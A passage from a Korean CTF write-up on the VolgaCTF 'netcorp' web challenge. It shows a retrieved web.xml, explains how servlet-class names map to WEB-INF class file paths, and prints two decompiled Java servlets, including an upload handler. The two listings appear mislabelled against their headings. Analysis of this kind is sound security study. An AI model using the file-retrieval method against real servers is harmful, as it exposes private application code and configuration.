class=\"grvsc-source\"><span class=\"mtk1\">\t\t&lt;</span><span class=\"mtk4\">error-code</span><span class=\"mtk1\">&gt;404&lt;/</span><span class=\"mtk4\">error-code</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t&lt;</span><span class=\"mtk4\">location</span><span class=\"mtk1\">&gt;/404.html&lt;/</span><span class=\"mtk4\">location</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t&lt;/</span><span class=\"mtk4\">error-page</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&lt;/</span><span class=\"mtk4\">web-app</span><span class=\"mtk1\">&gt;</span></span></span></code></pre>\n<p>파일을 성공적으로 읽어 들인 것을 확인 할 수 있습니다. <code>/WEB-INF/web.xml</code> 파일을 확인 해보면 특정 주소에 대해 서블릿이 맵핑이 되어 있고 <code>servlet-class</code> 명이 나와 있는 것을 확인 할 수 있습니다.</p>\n<p>이때 이 이름을 정보로 하여 클래스 파일을 가져옵니다.</p>\n<p><code>ru.volgactf.netcorp.ServeScreenshotServlet</code> => <code>/WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class</code></p>\n<p><code>ru.volgactf.netcorp.ServeComplaintServlet</code> => <code>/WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class</code></p>\n<p>Java Decompiler를 통해 class 파일을 분석합니다.</p>\n<p><code>ru.volgactf.netcorp.ServeScreenshotServlet.class</code></p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"java\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">java.io.IOException</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.ServletConfig</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.ServletException</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.annotation.MultipartConfig</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.http.HttpServlet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.http.HttpServletRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.http.HttpServletResponse</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@</span><span class=\"mtk11\">MultipartConfig</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">public</span><span class=\"mtk4\"> </span><span class=\"mtk10\">class</span><span class=\"mtk4\"> </span><span class=\"mtk11\">ServeComplaintServlet</span><span class=\"mtk4\"> </span><span class=\"mtk10\">extends</span><span class=\"mtk4\"> </span><span class=\"mtk11\">HttpServlet</span><span class=\"mtk4\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">private</span><span class=\"mtk4\"> </span><span class=\"mtk10\">static</span><span class=\"mtk4\"> </span><span class=\"mtk10\">final</span><span class=\"mtk4\"> </span><span class=\"mtk10\">long</span><span class=\"mtk4\"> serialVersionUID </span><span class=\"mtk8\">=</span><span class=\"mtk4\"> </span><span class=\"mtk7\">1L</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">private</span><span class=\"mtk4\"> </span><span class=\"mtk10\">static</span><span class=\"mtk4\"> </span><span class=\"mtk10\">final</span><span class=\"mtk4\"> </span><span class=\"mtk11\">String</span><span class=\"mtk4\"> SAVE_DIR </span><span class=\"mtk8\">=</span><span class=\"mtk4\"> </span><span class=\"mtk6\">&quot;uploads&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">public</span><span class=\"mtk3\"> ServeComplaintServlet</span><span class=\"mtk1\">()</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">System</span><span class=\"mtk1\">.</span><span class=\"mtk4\">out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">println</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;ServeScreenshotServlet Constructor called!&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">public</span><span class=\"mtk3\"> </span><span class=\"mtk10\">void</span><span class=\"mtk3\"> init</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ServletConfig</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">config</span><span class=\"mtk1\">)</span><span class=\"mtk3\"> </span><span class=\"mtk10\">throws</span><span class=\"mtk3\"> </span><span class=\"mtk11\">ServletException</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">System</span><span class=\"mtk1\">.</span><span class=\"mtk4\">out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">println</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;ServeScreenshotServlet </span><span class=\"mtk8\">\\&quot;</span><span class=\"mtk6\">Init</span><span class=\"mtk8\">\\&quot;</span><span class=\"mtk6\"> method called&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">public</span><span class=\"mtk3\"> </span><span class=\"mtk10\">void</span><span class=\"mtk3\"> destroy</span><span class=\"mtk1\">()</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">System</span><span class=\"mtk1\">.</span><span class=\"mtk4\">out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">println</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;ServeScreenshotServlet </span><span class=\"mtk8\">\\&quot;</span><span class=\"mtk6\">Destroy</span><span class=\"mtk8\">\\&quot;</span><span class=\"mtk6\"> method called&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">protected</span><span class=\"mtk3\"> </span><span class=\"mtk10\">void</span><span class=\"mtk3\"> doGet</span><span class=\"mtk1\">(</span><span class=\"mtk11\">HttpServletRequest</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">request</span><span class=\"mtk1\">, </span><span class=\"mtk11\">HttpServletResponse</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">response</span><span class=\"mtk1\">)</span><span class=\"mtk3\"> </span><span class=\"mtk10\">throws</span><span class=\"mtk3\"> </span><span class=\"mtk11\">ServletException</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk11\">IOException</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">protected</span><span class=\"mtk3\"> </span><span class=\"mtk10\">void</span><span class=\"mtk3\"> doPost</span><span class=\"mtk1\">(</span><span class=\"mtk11\">HttpServletRequest</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">request</span><span class=\"mtk1\">, </span><span class=\"mtk11\">HttpServletResponse</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">response</span><span class=\"mtk1\">)</span><span class=\"mtk3\"> </span><span class=\"mtk10\">throws</span><span class=\"mtk3\"> </span><span class=\"mtk11\">ServletException</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk11\">IOException</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>이 파일은 get, post 두가지 방식 모두 아무것도 하지 않기 때문에 분석을 멈추고 넘어 갔습니다.</p>\n<p><code>ru.volgactf.netcorp.ServeComplaintServlet.class</code></p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"java\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">java.io.File</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">java.io.IOException</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">java.io.PrintWriter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">java.math.BigInteger</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">java.security.MessageDigest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">java.security.NoSuchAlgorithmException</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.ServletConfig</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.ServletException</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.annotation.MultipartConfig</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.http.HttpServlet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.http.HttpServletRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.http.HttpServletResponse</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">javax.servlet.http.Part</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk4\"> </span><span class=\"mtk11\">ru.volgactf.netcorp.ServeScreenshotServlet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@</span><span class=\"mtk11\">MultipartConfig</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">public</span><span class=\"mtk4\"> </span><span class=\"mtk10\">class</span><span class=\"mtk4\"> </span><span class=\"mtk11\">ServeScreenshotServlet</span><span class=\"mtk4\"> </span><span class=\"mtk10\">extends</span><span class=\"mtk4\"> </span><span class=\"mtk11\">HttpServlet</span><span class=\"mtk4\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">private</span><span class=\"mtk4\"> </span><span class=\"mtk10\">static</span><span class=\"mtk4\"> </span><span class=\"mtk10\">final</span><span class=\"mtk4\"> </span><span class=\"mtk11\">String</span><span class=\"mtk4\"> SAVE_DIR </span><span class=\"mtk8\">=</span><span class=\"mtk4\"> </span><span class=\"mtk6\">&quot;uploads&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">public</span><span class=\"mtk3\"> ServeScreenshotServlet</span><span class=\"mtk1\">()</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">System</span><span class=\"mtk1\">.</span><span class=\"mtk4\">out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">println</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;ServeScreenshotServlet Constructor called!&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">public</span><span class=\"mtk3\"> </span><span class=\"mtk10\">void</span><span class=\"mtk3\"> init</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ServletConfig</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">config</span><span class=\"mtk1\">)</span><span class=\"mtk3\"> </span><span class=\"mtk10\">throws</span><span class=\"mtk3\"> </span><span class=\"mtk11\">ServletException</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">System</span><span class=\"mtk1\">.</span><span class=\"mtk4\">out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">println</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;ServeScreenshotServlet </span><span class=\"mtk8\">\\&quot;</span><span class=\"mtk6\">Init</span><span class=\"mtk8\">\\&quot;</span><span class=\"mtk6\"> method called&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">public</span><span class=\"mtk3\"> </span><span class=\"mtk10\">void</span><span class=\"mtk3\"> destroy</span><span class=\"mtk1\">()</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">System</span><span class=\"mtk1\">.</span><span class=\"mtk4\">out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">println</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;ServeScreenshotServlet </span><span class=\"mtk8\">\\&quot;</span><span class=\"mtk6\">Destroy</span><span class=\"mtk8\">\\&quot;</span><span class=\"mtk6\"> method called&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">protected</span><span class=\"mtk3\"> </span><span class=\"mtk10\">void</span><span class=\"mtk3\"> doPost</span><span class=\"mtk1\">(</span><span class=\"mtk11\">HttpServletRequest</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">request</span><span class=\"mtk1\">, </span><span class=\"mtk11\">HttpServletResponse</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">response</span><span class=\"mtk1\">)</span><span class=\"mtk3\"> </span><span class=\"mtk10\">throws</span><span class=\"mtk3\"> </span><span class=\"mtk11\">ServletException</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk11\">IOException</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">appPath</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">request</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getServletContext</span><span class=\"mtk1\">().</span><span class=\"mtk3\">getRealPath</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">savePath</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> appPath </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;uploads&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">File</span><span class=\"mtk1\"> </span><span class=\"mtk4\">fileSaveDir</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk10\">new</span><span class=\"mtk1\"> </span><span class=\"mtk3\">File</span><span class=\"mtk1\">(savePath);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk8\">!</span><span class=\"mtk4\">fileSaveDir</span><span class=\"mtk1\">.</span><span class=\"mtk3\">exists</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">fileSaveDir</span><span class=\"mtk1\">.</span><span class=\"mtk3\">mkdir</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">submut</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">request</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getParameter</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;submit&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (submut </span><span class=\"mtk8\">==</span><span class=\"mtk1\"> </span><span class=\"mtk7\">null</span><span class=\"mtk1\"> </span><span class=\"mtk8\">||</span><span class=\"mtk1\"> </span><span class=\"mtk8\">!</span><span class=\"mtk4\">submut</span><span class=\"mtk1\">.</span><span class=\"mtk3\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;true&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">Part</span><span class=\"mtk1\"> </span><span class=\"mtk4\">part</span><span class=\"mtk1\"> </span><span class=\"mtk10\">:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">request</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getParts</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">fileName</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">extractFileName</span><span class=\"mtk1\">(part);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      fileName </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">new</span><span class=\"mtk1\"> </span><span class=\"mtk3\">File</span><span class=\"mtk1\">(fileName)).</span><span class=\"mtk3\">getName</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">hashedFileName</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">generateFileName</span><span class=\"mtk1\">(fileName);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">path</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> savePath </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk4\">File</span><span class=\"mtk1\">.</span><span class=\"mtk4\">separator</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> hashedFileName;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">path</span><span class=\"mtk1\">.</span><span class=\"mtk3\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;Error&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">part</span><span class=\"mtk1\">.</span><span class=\"mtk3\">write</span><span class=\"mtk1\">(path);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">PrintWriter</span><span class=\"mtk1\"> </span><span class=\"mtk4\">out</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">response</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getWriter</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">response</span><span class=\"mtk1\">.</span><span class=\"mtk3\">setContentType</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;application/json&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">response</span><span class=\"mtk1\">.</span><span class=\"mtk3\">setCharacterEncoding</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;UTF-8&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">print</span><span class=\"mtk1\">(</span><span class=\"mtk4\">String</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;{&#39;success&#39;:&#39;%s&#39;}&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">new</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Object</span><span class=\"mtk1\">[] { </span><span class=\"mtk6\">&quot;true&quot;</span><span class=\"mtk1\"> }));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">flush</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">private</span><span class=\"mtk3\"> </span><span class=\"mtk11\">String</span><span class=\"mtk3\"> generateFileName</span><span class=\"mtk1\">(</span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">fileName</span><span class=\"mtk1\">)</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">try</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">MessageDigest</span><span class=\"mtk1\"> </span><span class=\"mtk4\">md</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">MessageDigest</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getInstance</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;MD5&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">md</span><span class=\"mtk1\">.</span><span class=\"mtk3\">update</span><span class=\"mtk1\">(</span><span class=\"mtk4\">fileName</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getBytes</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">byte</span><span class=\"mtk1\">[] </span><span class=\"mtk4\">digest</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">md</span><span class=\"mtk1\">.</span><span class=\"mtk3\">digest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">s2</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">new</span><span class=\"mtk1\"> </span><span class=\"mtk3\">BigInteger</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, digest)).</span><span class=\"mtk3\">toString</span><span class=\"mtk1\">(</span><span class=\"mtk7\">16</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">StringBuilder</span><span class=\"mtk1\"> </span><span class=\"mtk4\">sb</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk10\">new</span><span class=\"mtk1\"> </span><span class=\"mtk3\">StringBuilder</span><span class=\"mtk1\">(</span><span class=\"mtk7\">32</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">int</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span 